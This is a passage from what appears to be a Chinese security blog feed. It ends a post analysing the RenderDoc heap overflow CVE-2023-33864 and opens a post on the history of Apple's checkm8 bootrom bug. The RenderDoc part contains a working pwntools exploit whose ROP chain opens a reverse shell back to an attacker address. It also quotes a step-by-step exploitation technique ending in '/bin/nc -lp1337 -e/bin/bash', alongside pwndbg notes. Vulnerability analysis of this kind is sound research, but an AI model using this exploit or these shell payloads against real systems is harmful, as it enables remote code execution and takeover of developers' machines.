    <span class="n">pop_rsi_ret_addr</span> <span class="o">=</span> <span class="n">pop_rsi_ret</span> <span class="o">+</span> <span class="n">text_base</span>
    <span class="n">pop_rax_ret_addr</span> <span class="o">=</span> <span class="n">pop_rax_ret</span> <span class="o">+</span> <span class="n">text_base</span>
    <span class="n">pop_rbx_ret_addr</span> <span class="o">=</span> <span class="n">pop_rbx_ret</span> <span class="o">+</span> <span class="n">text_base</span>
    <span class="n">pop_rcx_ret_addr</span> <span class="o">=</span> <span class="n">pop_rcx_ret</span> <span class="o">+</span> <span class="n">text_base</span>
    <span class="n">pop_rdx_ret_addr</span> <span class="o">=</span> <span class="n">pop_rdx_ret</span> <span class="o">+</span> <span class="n">text_base</span>
    <span class="n">xchg_rdi_rax_ret_addr</span> <span class="o">=</span> <span class="n">xchg_rdi_rax_ret</span> <span class="o">+</span> <span class="n">text_base</span>
    <span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">binsh_off</span> <span class="o">+</span> <span class="n">heap_base</span>
    <span class="n">sockaddr_addr</span> <span class="o">=</span> <span class="n">binsh_addr</span> <span class="o">+</span> <span class="mh">0x8</span>
    
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">heap base address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">text base address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">text_base</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">libc base address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">dup2  address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">execve  address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">execv_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">ret gadget address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">pop_rdi_gadget gadget address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">pop_rsi_gadget gadget address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">xchg_rdi_rax_ret gadget address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">xchg_rdi_rax_ret_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">pop_rax_gadget gadget address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">pop_rax_ret_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">pop_rbx_gadget gadget address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">pop_rbx_ret_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">pop_rcx_gadget gadget address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">pop_rcx_ret_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">pop_rdx_gadget gadget address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">pop_rdx_ret_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">binsh address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    
    <span class="c1"># step 7: spawn a remote shell
</span>    <span class="c1"># fd = 6
</span>    <span class="n">rop_chain</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span>
    <span class="c1">#struct sockaddr_in
</span>    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x010011ac0a1a0002</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x0000556b2b358120</span><span class="p">)</span>
    
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x26c</span>
    <span class="c1"># int fd = socket(AF_INET, SOCK_STREAM, 0);
</span>    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdx_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">socket_addr</span><span class="p">)</span>
    <span class="c1"># dup2(7, 0)
</span>    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span>
    <span class="c1"># dup2(7, 1)
</span>    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span>
    <span class="c1"># dup2(7, 2)
</span>    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span>
    <span class="c1"># connect(fd, (struct sockaddr *)&amp;serv_addr, sizeof(serv_addr));
</span>    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">sockaddr_addr</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdx_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">connect_addr</span><span class="p">)</span>
    <span class="c1"># execv("/bin/sh", NULL)
</span>    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span> 
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">execv_addr</span><span class="p">)</span>
    <span class="n">rop_chain</span><span class="p">.</span><span class="nf">rjust</span><span class="p">(</span><span class="mh">0x900000</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
    
    <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="p">)</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> \
             <span class="nf">p32</span><span class="p">(</span><span class="mh">0x900000</span><span class="p">)</span> <span class="o">+</span> <span class="n">rop_chain</span> <span class="o">+</span> \
             <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x40</span>
             
    <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">**** enjoy reverse shell on </span><span class="sh">'</span><span class="s">$ nc -lvnp 6666</span><span class="sh">'</span><span class="s">  ****</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>

<p>运行结果：</p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%89%B9%E6%B3%A8_2025-05-21_093704.png" alt="批注 2025-05-21 093704.png" /></p>

<h1 id="pwndbg命令学习">pwndbg命令学习</h1>

<ul>
  <li>info thread：查看线程信息</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; info thread
  Id   Target Id                                          Frame 
  1    Thread 0x7f500cf56dc0 <span class="o">(</span>LWP 2989<span class="o">)</span> <span class="s2">"sleep"</span>           0x00007f500d54223f <span class="k">in </span>__GI___clock_nanosleep <span class="o">(</span><span class="nv">clock_id</span><span class="o">=</span>clock_id@entry<span class="o">=</span>0, 
    <span class="nv">flags</span><span class="o">=</span>flags@entry<span class="o">=</span>0, <span class="nv">req</span><span class="o">=</span>0x7ffd00b15e60, <span class="nv">rem</span><span class="o">=</span>0x0<span class="o">)</span> at ../sysdeps/unix/sysv/linux/clock_nanosleep.c:78
<span class="k">*</span> 2    Thread 0x7f500cf53700 <span class="o">(</span>LWP 2991<span class="o">)</span> <span class="s2">"TargetControlSe"</span> 0x00007f500d54223f <span class="k">in </span>__GI___clock_nanosleep <span class="o">(</span><span class="nv">clock_id</span><span class="o">=</span>clock_id@entry<span class="o">=</span>0, 
    <span class="nv">flags</span><span class="o">=</span>flags@entry<span class="o">=</span>0, <span class="nv">req</span><span class="o">=</span>req@entry<span class="o">=</span>0x7f500cf52ae0, <span class="nv">rem</span><span class="o">=</span>rem@entry<span class="o">=</span>0x0<span class="o">)</span> at ../sysdeps/unix/sysv/linux/clock_nanosleep.c:78
</code></pre></div></div>

<ul>
  <li>thread id：切换到线程id，后面的heap等命令查看的就是某个线程的堆了</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; thread 2
<span class="o">[</span>Switching to thread 2 <span class="o">(</span>Thread 0x7f500cf53700 <span class="o">(</span>LWP 2991<span class="o">))]</span>
<span class="c">#0  0x00007f500d54223f in __GI___clock_nanosleep (clock_id=clock_id@entry=0, flags=flags@entry=0, req=req@entry=0x7f500cf52ae0, </span>
    <span class="nv">rem</span><span class="o">=</span>rem@entry<span class="o">=</span>0x0<span class="o">)</span> at ../sysdeps/unix/sysv/linux/clock_nanosleep.c:78
78      <span class="k">in</span> ../sysdeps/unix/sysv/linux/clock_nanosleep.c
</code></pre></div></div>

<ul>
  <li>ignore break_point_num NUM：break_point_num 断点命中第NUM次后断下</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; info <span class="nb">break
</span>Num     Type           Disp Enb Address            What
4       breakpoint     keep y   0x00007f4d57ced01e <span class="k">in </span>RenderDoc::TargetControlServerThread<span class="o">(</span>Network::Socket<span class="k">*</span><span class="o">)</span> at /test/renderdoc/renderdoc/core/target_control.cpp:473
        breakpoint already hit 9 <span class="nb">times
</span>pwndbg&gt; ignore 4 8
Will ignore next 8 crossings of breakpoint 4.
</code></pre></div></div>

<h1 id="参考资料">参考资料</h1>

<p><a href="http://tukan.farm/2016/07/27/munmap-madness/">munmap madness · Online tukan sanctuary</a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Exploitation
------------------------------------------------------------------------

1/ When librenderdoc.so's server thread is created, the glibc's malloc
allocates a new "heap" for this thread: 64MB of mmap()ed memory, whose
start address is aligned on a multiple of 64MB. Initially, this heap is
mmap()ed PROT_NONE, and is mprotect()ed read-write as needed by malloc:

    0                                       64M
----V----------------------------------------V--------------|-------------
    |          server thread's heap          |  random gap  |  libraries
----|----------------------------------------|--------------|-------------

Note: the gap of unmapped memory between the heap and the libraries is
random (and smaller than 64MB), because the heap is aligned on 64MB but
the libraries are randomly aligned on 4KB (or sometimes 2MB) by ASLR.

2/ We (remote attackers) establish 7 successive connections to the
server on TCP port 38920: for each one of these connections, the server
creates a new thread (a "client thread"), allocates a new thread stack
(8MB+4KB of mmap()ed memory, for the stack and its guard page), and then
memory-leaks this stack (because the server does not call pthread_join()
when the client thread terminates abnormally, which prevents its stack
from being freed or reused for another client thread).

The goal of this step 2/ is simply to fill the random gap between the
heap and the libraries (with the help of a memory leak), to prevent any
future thread stack from being allocated into this gap. The reason for
doing this will become clear in step 7/.

3/ We connect to the server on TCP port 38920, send a handshake packet
that contains a 16MB client-name string (it must be longer than 10MB to
trigger CVE-2023-33864), and obtain the following layout for the
server's heap:

  0                           14M  16M      20M              28M      32M
--V-+-+-+-+--------------------V----V--------V----------------V--------V--
  |F|I|L|C|               ....
--|-+-+-+-+---------------------------------------------------------------

- F are fixed chunks of memory (at the very beginning of the heap) that
  were not allocated by us but whose sizes are known to us;

- I is the 64KB intermediary buffer mentioned in the previous section;

- L is a small chunk that was memory-leaked (or free()d but stored in an
  otherwise unused tcache) and whose size is exactly controlled by us;

- C is a small chunk (a "callstack" from our handshake packet) whose
  exact size and contents do not matter much.

4/ We overflow the intermediary buffer I (thanks to CVE-2023-33864),
overwrite L's malloc_chunk header with an unchanged size field, and
overwrite C's malloc_chunk header with arbitrary prev_size and size
fields.

5/ The server free()s the intermediary buffer I. This free() succeeds
despite our buffer overflow because we overwrote the malloc_chunk header
of I's next chunk (L) with an unchanged size; without L between I and C,
free()'s security checks would detect that we overwrote C's malloc_chunk
header with arbitrary sizes and would abort().

6/ The server free()s the small chunk C. Because we overwrote C's
malloc_chunk header with a size field whose IS_MMAPPED bit is set,
free() calls its internal function munmap_chunk():

------------------------------------------------------------------------
3018 static void
3019 munmap_chunk (mchunkptr p)
3020 {
3021   size_t pagesize = GLRO (dl_pagesize);
3022   INTERNAL_SIZE_T size = chunksize (p);
....
3026   uintptr_t mem = (uintptr_t) chunk2mem (p);
3027   uintptr_t block = (uintptr_t) p - prev_size (p);
3028   size_t total_size = prev_size (p) + size;
....
3034   if (__glibc_unlikely ((block | total_size) &amp; (pagesize - 1)) != 0
3035       || __glibc_unlikely (!powerof2 (mem &amp; (pagesize - 1))))
3036     malloc_printerr ("munmap_chunk(): invalid pointer");
....
3044   __munmap ((char *) block, total_size);
3045 }
------------------------------------------------------------------------

- we fully control prev_size and size (because p is a pointer to C's
  malloc_chunk header, which we overwrote), so we can munmap() an
  arbitrary block of memory (at line 3044), relative to p (i.e.,
  relative to C, and without knowing the ASLR);

- we can easily satisfy the preconditions at lines 3034 and 3035,
  because we fully control prev_size and size, and because we know the
  sizes of F and I, and we precisely control the size of L.

We exploit this arbitrary munmap() to punch a hole of exactly 8MB+4KB
(the size of a thread stack and its guard page) in the middle of the
server's heap:

  0                           14M  16M      20M              28M      32M
--V-+-+-+-+--------------------V----V--------V----------------V--------V--
  |F|I|L|C|               ....               |  punched hole  |
--|-+-+-+-+----------------------------------+----------------+-----------

Note: we cannot reuse the technique that we developed to exploit
CVE-2005-1513 (in qmail) here, because of the random gap between the
server's heap and the libraries (and our exploit here must be one-shot);
for reference:

  https://www.qualys.com/2020/05/19/cve-2005-1513/remote-code-execution-qmail.txt
  https://maxwelldulin.com/BlogPost/House-of-Muney-Heap-Exploitation
  https://www.ambionics.io/blog/hacking-watchguard-firewalls

7/ We connect to the server on TCP port 38920; the server creates a new
client thread, and allocates a new stack for this thread, exactly into
the hole that we punched in the server's heap (since step 2/ such a
stack cannot be allocated anymore into the random gap between the
server's heap and the libraries):

  0                           14M  16M      20M              28M      32M
--V-+-+-+-+--------------------V----V--------V----------------V--------V--
  |F|I|L|C|               ....               |  client stack  |
--|-+-+-+-+----------------------------------+----------------+-----------

We then disconnect from the server; the client thread terminates cleanly
and the server pthread_join()s with it, thus making its stack available
for a future client thread.

8/ We establish a long-lived connection to the server, and send a 14MB
client-name string (but we do not trigger CVE-2023-33864 this time); the
server reads our client name into a malloc()ated string buffer that ends
in the middle of the unused client stack (i.e., this client name and the
client stack overlap in the server's heap):

  0                           14M  16M      20M              28M      32M
--V-+-+-+-+--------------------V----V--------V----------------V--------V--
  |F|I|L|C|        ....        |             |  client stack  |
--|-+-+-+-+--------------------+-------------+-------------+--+-----------
                               |---------------------------|
                                        client name

Note: although the client stack's guard page is initially mmap()ed
PROT_NONE, it is conveniently mprotect()ed read-write by the glibc's
malloc when extending the server's heap for our 14MB client name (in
grow_heap())!

The server then creates a new client thread for our long-lived
connection, and reuses the existing client stack for this thread, thus
overwriting the end of our client name with data from the client stack.

9/ We establish another connection to the server; however, because our
first connection is still alive, the server disconnects us, but first
gives us the name of the client that is already connected (i.e., the
server sends us back our 14MB client name, which was partly overwritten
by data from the client stack), thus information-leaking all sorts of
stack contents to us: heap addresses, library addresses, stack
addresses, the stack canary, etc.

10/ While our first connection to the server is still alive, we
establish another connection and start sending a 9MB string; the server
reads this string into a malloc()ated buffer that starts in the middle
of the client stack (immediately after the 14MB client name), thus
overwriting the client stack with data that we fully control (a ROP
chain):

  0                           14M  16M      20M              28M      32M
--V-+-+-+-+--------------------V----V--------V----------------V--------V--
  |F|I|L|C|        ....        |             |  client stack  |
--|-+-+-+-+--------------------+-------------+-------------+--+-----------
                               |---------------------------|---&gt;
                                        client name         ROP

As soon as the client thread returns to a saved instruction pointer
(RIP) from the overwritten part of the client stack, our ROP chain is
executed: first a "ROP sled" (a series of minimal "ret" gadgets, because
we do not know the exact distance between the start of our ROP chain and
the first overwritten saved RIP in the client stack), followed by a
simple execve() of "/bin/nc -lp1337 -e/bin/bash".

Note: we build our ROP chain with gadgets from librenderdoc.so only
(whose address was information-leaked to us in step 9/), to avoid any
dependence on the application being debugged or its shared libraries.

To summarize this reliable, one-shot technique that we used to exploit
the heap-based buffer overflow in librenderdoc.so's multi-threaded TCP
server:

- we overwrite the malloc_chunk header of a heap-based buffer (which
  will be free()d) with an arbitrary size field whose IS_MMAPPED bit is
  set, and therefore transform this buffer overflow into an arbitrary
  munmap() call (thanks to free()'s munmap_chunk() function);

- with this arbitrary munmap() call, we punch a hole of exactly 8MB+4KB
  (the size of a thread stack) in the middle of the server's heap;

- we arrange for a thread stack to be mmap()ed into this hole, and for a
  string (which will later be sent to us by the server) to be
  malloc()ated over the lower part of this thread stack;

- when this string is sent to us by the server, parts of it were
  overwritten by data from the thread stack, thus information-leaking
  all sorts of stack contents to us (heap addresses, library addresses,
  stack addresses, the stack canary, etc);

- finally, we arrange for another string (which we fully control) to be
  malloc()ated over the higher part of the thread stack, and therefore
  overwrite a saved instruction pointer (in the thread stack) with a ROP
  chain of gadgets from librenderdoc.so (whose address was previously
  information-leaked to us) -- a classic "stack smashing" attack.

Note: further possibilities for munmap_chunk() exploitation are explored
in http://tukan.farm/2016/07/27/munmap-madness/.

</code></pre></div></div>]]></content><author><name></name></author><category term="userspace" /><summary type="html"><![CDATA[RenderDoc 是一款开源的图形调试工具，主要用于实时捕获、分析和调试 OpenGL 和 OpenGL ES 等图形 API 的渲染过程。它被广泛应用于 游戏开发、图形引擎优化、GPU 驱动问题排查等领域，支持 Windows、Linux 和 Android 平台。]]></summary></entry><entry><title type="html">深入分析苹果设备 checkm8 漏洞</title><link href="http://localhost:4000/hardware/2025/05/25/%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90%E8%8B%B9%E6%9E%9C%E8%AE%BE%E5%A4%87-checkm8-%E6%BC%8F%E6%B4%9E.html" rel="alternate" type="text/html" title="深入分析苹果设备 checkm8 漏洞" /><published>2025-05-25T13:27:38+08:00</published><updated>2025-05-25T13:27:38+08:00</updated><id>http://localhost:4000/hardware/2025/05/25/%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90%E8%8B%B9%E6%9E%9C%E8%AE%BE%E5%A4%87-checkm8-%E6%BC%8F%E6%B4%9E</id><content type="html" xml:base="http://localhost:4000/hardware/2025/05/25/%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90%E8%8B%B9%E6%9E%9C%E8%AE%BE%E5%A4%87-checkm8-%E6%BC%8F%E6%B4%9E.html"><![CDATA[<p>checkm8是影响苹果A5～A11系列芯片的bootrom漏洞，该漏洞位于USB协议栈，包含了一个释放后重引用漏洞和一个内存泄漏bug。攻击者利用checkm8可以实现bootrom级别的任意代码执行，破坏设备的安全启动链，实现苹果设备固件dump和系统越狱。漏洞在生产阶段已经固化在芯片的ROM区域，无法通过软件更新来修补。</p>

<p>checkm8最早由littlelailo在2019年5月31日公布并被命名为“moonshine”，当时漏洞利用已经在A8芯片上完成了适配。时隔3个月2019年9月27日checkra1n团队成员axi0mX在推特公布了该漏洞，正式命名为“checkm8”，同一天公开了漏洞利用工具ipwndfu，实现了A系列芯片大范围适配，以其能够将当时最新苹果设备的核心机密SecureROM成功dump出来而一夜走红，成为当时的热点事件，而checkm8这个叫法也因此被大众所熟知。</p>

<p>checkm8的魅力在于，至今为止它仍然是越狱老旧苹果设备的主要手段，越狱社区也基于该漏洞开发出了成熟稳定的越狱软件chackra1n。</p>

<h1 id="事件背景">事件背景</h1>

<h2 id="事件发展">事件发展</h2>

<ul>
  <li>2018年2月8日iBoot源码泄漏事件：</li>
</ul>

<p><a href="https://mp.weixin.qq.com/s?__biz=MzkzMDY1NDgyOQ==&amp;mid=2247777999&amp;idx=1&amp;sn=bc4b3713a056320dfc2a63152d8682dd&amp;source=41#wechat_redirect"><strong>史上最大源码泄露事件：iOS 关键源代码被匿名公布在 GitHub 上</strong></a></p>

<p><a href="https://www.zhihu.com/question/266898229"><strong>如何看待 2018 年 2 月 8 日iBoot源代码泄漏事件？</strong></a></p>

<ul>
  <li>
    <p>2018年2月9日苹果发布声明<a href="https://tech.sina.com.cn/it/2018-02-09/doc-ifyrkuxs4997460.shtml">“<strong>该源代码已过时 不必担忧</strong>”</a></p>
  </li>
  <li>
    <p>2019年9月27日国外安全员<a href="https://x.com/axi0mX">@axi0mX</a>通过公开了一个iPhone BootROM 的漏洞和<a href="https://github.com/axi0mX/ipwndfu">漏洞利用工具</a>：</p>
  </li>
</ul>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-18_08.58.11.png" alt="截屏2025-03-18 08.58.11.png" /></p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-18_10.10.37.png" alt="截屏2025-03-18 10.10.37.png" /></p>

<p><a href="https://www.expreview.com/70777.html"><strong>为什么说这次苹果A系列处理器中的BootROM漏洞是史诗级的？</strong></a></p>

<p><a href="https://zhuanlan.zhihu.com/p/87456653"><strong>iPhone史诗级漏洞checkm8攻击原理浅析</strong></a></p>

<p>为什么我们把checkm8漏洞用“史诗”来形容，因为该漏洞影响面之广，引发的反响之强烈，对研究苹果安全具有深远的意义。作者认为该漏洞在苹果越狱史上能留下一笔，称之为“EPIC JAILBREAK”。</p>

<p>源码泄漏事件发生后，大部分吃瓜网友从iOS操作系统的角度认为这并不是一件值得大惊小怪的事情，但这也不排除是苹果请来的水军……</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-18_10.03.51.png" alt="截屏2025-03-18 10.03.51.png" /></p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-18_10.04.29.png" alt="截屏2025-03-18 10.04.29.png" /></p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-18_10.04.57.png" alt="截屏2025-03-18 10.04.57.png" /></p>

<p>苹果当时也希望此事低调处理，把公众的视线引向“过时的iOS源代码”这一话题。</p>

<p>因为大部分人不了解设备底层，所以不知道这份泄漏源码对破解iPhone的重要性。</p>

<p>但最早在Reddit上公布“iBoot 源码已被泄漏”这一消息的用户Apple External表示，“泄漏的代码里面包含了bootrom的源代码，并且这份bootrom源码已经在多个设备上面使用”。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/640.webp" alt="640.webp" /></p>

<p>这个事情的性质就完全不同了，因为iOS源码可以通过打补丁的方式修补漏洞。但是bootrom级别的漏洞，引导阶段被利用，大概率只能先放着了。</p>

<p>假如苹果为将来的型号囤了大量的芯片，或者当时正在热销的型号用了这些芯片（iPhone X、iPhone 8/8 Plus当时正在热销，iPad 6当年发布，iPad 7于2019年发布，iPod Touch 7于2019年发布），如果这些芯片存在着不可修复的bootrom漏洞，也就意味着现在的漏洞能攻陷将来的设备……，因为苹果不太可能因为这个事情就把真金白银采购的芯片做报废处理吧。</p>

<p>快进到2019年9月27日@axi0mX公开的<a href="https://x.com/axi0mX/status/1177542201670168576">checkm8</a>漏洞及其漏洞利用工具<a href="https://github.com/axi0mX/ipwndfu">ipwndfu</a></p>

<p>1年前泄漏的iBoot源代码和checkm8漏洞的发现到底有没有关系？</p>

<p>axi0mX声称他是通过补丁对比发现了这一漏洞。2018年夏，苹果在iOS12中修补了iBoot USB代码中的一个UAF漏洞。根据泄漏的iBoot看，iBoot和SecureROM共享了部分代码，所以axi0mX猜测在SecureROM中也存在该漏洞也是合理的。他并没有明说参考了泄漏的源码。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-18_13.55.37.png" alt="截屏2025-03-18 13.55.37.png" /></p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-18_13.54.57.png" alt="截屏2025-03-18 13.54.57.png" /></p>

